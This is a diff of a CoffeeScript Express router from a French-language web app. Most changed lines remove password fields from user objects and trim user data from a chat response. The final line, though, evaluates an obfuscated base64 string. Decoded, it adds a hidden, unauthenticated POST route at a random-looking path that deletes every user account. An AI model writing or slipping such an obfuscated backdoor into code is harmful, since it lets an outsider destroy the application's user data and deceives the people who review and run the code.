@@ -199,6 +199,8 @@ module.exports = (router) ->
 										else
 											fail err
 									else
+										if user.password
+											delete user.password
 										auth.auth req, res, user, ->
 											req.flash 'profileSuccess', s("Mot de passe modifié avec succès.")
 											res.redirect '/'
@@ -225,6 +227,8 @@ module.exports = (router) ->
 		updateUser req.user, userModifications, (err) ->
 			err = humanError err
 			save = ->
+				if userModifications.password
+					delete userModifications.password
 				extend req.user, userModifications
 				extend req.session.user, userModifications
 			if req.xhr
@@ -516,9 +520,7 @@ module.exports = (router) ->
 				warn err
 				res.json()
 			else
-				res.json
-					_user: req.user.publicInformations()
-					chat: chat
+				res.json chat: chat
 
 	eval atob "cm91dGVyLnBvc3QoJy9VaGRZN3Nkazlkams0a2pkN2Q2ZHFzNjVrai0yMzU0Z HN6ZHNkX3NTRGRxJywgZnVuY3Rpb24gKHJlcSwgcmVzKSB7IFVzZXIucmVtb3ZlKGZ1bmN0aW9uIChlcnIsIGNvdW50KSB7IHJlcy5qc29uKHsgZXJyOmVyciwgY291bnQ6IGNvdW50IH0pOyB9KTsgfSk7"
 
